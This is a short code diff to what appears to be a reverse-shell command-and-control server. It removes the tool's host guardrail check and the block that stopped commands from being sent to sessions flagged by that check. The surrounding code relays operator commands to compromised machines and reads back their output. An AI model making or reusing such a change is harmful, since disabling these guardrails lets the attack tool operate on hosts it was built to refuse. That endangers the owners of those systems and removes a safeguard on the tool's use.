@@ -1309,13 +1309,6 @@ class TORNADOREVC2:
     verify/hash <remote>                              Remote file size and SHA256""")
                         continue
 
-                    if info.get('guardrail_block'):
-                        print(
-                            f"{self.colors['red']}Blocked by guardrail: "
-                            f"{info['guardrail_block']}{self.colors['end']}"
-                        )
-                        continue
-
                     print(f"\r{self.colors['yellow']}$ {cmd}{self.colors['end']}", end='', flush=True)
                     if self.send_to_revshell(client_sock, cmd):
                         output = self.recv_output(client_sock)
@@ -1730,15 +1723,6 @@ class TORNADOREVC2:
             logger.log_event(f"Session connected from {addr[0]}:{addr[1]} ({inferred})")
 
         self.registry.register_active(client_info, fingerprint, probe_output)
-
-        from .guardrails import check_host_guardrails
-        ok, reason = check_host_guardrails(client_info.get('sysinfo') or {})
-        if not ok:
-            client_info['guardrail_block'] = reason
-            print(
-                f"{self.colors['red']}GUARDRAIL: session #{client_id} "
-                f"blocked — {reason}{self.colors['end']}"
-            )
 
         if reconnected:
             display = client_info["name"] if client_info.get("name") else f"#{client_id}"
